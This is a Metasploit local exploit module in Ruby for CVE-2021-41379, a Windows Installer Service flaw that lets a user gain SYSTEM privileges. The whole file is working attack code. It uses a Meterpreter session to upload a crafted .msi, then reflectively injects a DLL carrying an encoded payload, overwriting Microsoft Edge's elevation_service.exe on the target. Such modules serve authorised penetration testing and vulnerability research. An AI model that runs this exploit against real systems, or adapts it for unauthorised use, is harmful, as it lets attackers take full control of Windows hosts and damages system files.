##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows Installer Service Privilege Escalation',
        'Description' => %q{
          On vulnerable versions of Windows the Installer Service executes privileged file operations on
          the rollback file that is created in a standard user controlled directory. This behaviour can be
          triggered by failing installation the installation with a specific .msi file. The bug is abused
          to redirect file creation into an arbitrary location in order to gain SYSTEM level privileges.

          WARNING:
          The elevation_service.exe (C:\Program Files (x86)\Microsoft\Edge\Application\*) on the target host
          will be overwritten when the exploit runs.

          This module has been tested against Windows 10 Pro x64 Build 19044.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Abdelhamid Naceri (klinix5)', # Original discovery and PoC
          'millers-crossing' # msf module
        ],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [
          ['Windows 10 x64', { 'Arch' => ARCH_X64 }]
        ],
        'References' => [
          %w[CVE 2021-41379],
          ['URL', 'https://github.com/klinix5/InstallerFileTakeOver']
        ],
        'Notes' => {
          # Exploit overwrites Microsoft Edge elevation_service.exe.
          'Stability' => [OS_RESOURCE_LOSS],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'DisclosureDate' => '2021-11-22',
        'DefaultTarget' => 0
      )
    )
  end

  def validate_active_host
    sysinfo['Computer']
    true
  rescue Rex::Post::Meterpreter::RequestError, Rex::TimeoutError => e
    elog(e)
    false
  end

  def validate_target
    fail_with(Failure::None, 'Session is already elevated') if is_system?

    fail_with(Failure::None, 'The exploit does not support high integrity process') if is_high_integrity?

    fail_with(Failure::NoTarget, 'Exploit code is 64-bit only') if sysinfo['Architecture'] == ARCH_X86

    fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP') if sysinfo['OS'] =~ /XP/
  end

  def exploit
    fail_with(Failure::None, 'Only meterpreter sessions are supported') unless session.type == 'meterpreter'

    print_status('Checking target...')
    raise Msf::Exploit::Failed, 'Could not connect to session' unless validate_active_host

    validate_target

    print_status('Target looks good... attempting the LPE exploit')

    # Need to upload .msi with meterpreter session because
    # resource in the original poc fails with rdllinject
    temp_path = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')
    msi_local = ::File.join(Msf::Config.data_directory, 'exploits', 'installerfiletakeover',
                            'InstallerFileTakeOver.msi')
    msi_path = "#{temp_path}\\testPkg.msi"
    upload_file(msi_path, msi_local)

    encoded_payload = generate_payload_exe_service

    # Need to exploit with x86 payload dll
    execute_dll(
      ::File.join(Msf::Config.data_directory, 'exploits', 'installerfiletakeover', 'InstallerFileTakeOver.x86.dll'),
      [encoded_payload.length].pack('I<') + encoded_payload
    )
    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  rescue Rex::Post::Meterpreter::RequestError => e
    elog(e)
    print_error(e.message)
  end
end
